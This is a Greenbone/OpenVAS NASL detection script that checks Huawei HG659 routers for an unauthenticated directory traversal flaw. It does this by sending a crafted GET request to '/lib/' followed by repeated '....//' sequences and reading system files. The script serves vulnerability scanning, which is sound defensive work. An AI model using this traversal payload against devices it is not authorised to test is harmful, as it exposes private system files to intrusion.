CPE = "cpe:/o:huawei:hg659_firmware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.146156" );
	script_version( "2021-07-22T10:35:30+0000" );
	script_tag( name: "last_modification", value: "2021-07-22 10:35:30 +0000 (Thu, 22 Jul 2021)" );
	script_tag( name: "creation_date", value: "2021-06-21 06:54:05 +0000 (Mon, 21 Jun 2021)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "NoneAvailable" );
	script_name( "Huawei HG659 Directory Traversal Vulnerability (Jun 2021)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Huawei" );
	script_dependencies( "gb_huawei_home_gateway_http_detect.sc" );
	script_mandatory_keys( "huawei/home_gateway/http/detected" );
	script_require_ports( "Services/www", 443 );
	script_tag( name: "summary", value: "Huawei HG659 is prone to a directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "impact", value: "An unauthenticated attacker might read arbitrary files." );
	script_tag( name: "solution", value: "No known solution is available as of 22th July, 2021.
  Information regarding this issue will be updated once solution details are available." );
	script_xref( name: "URL", value: "https://twitter.com/sec715/status/1406782172443287559" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	url = "/lib/" + crap( data: "....//", length: 8 * 6 ) + files[pattern];
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = http_report_vuln_url( port: port, url: url ) + "\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

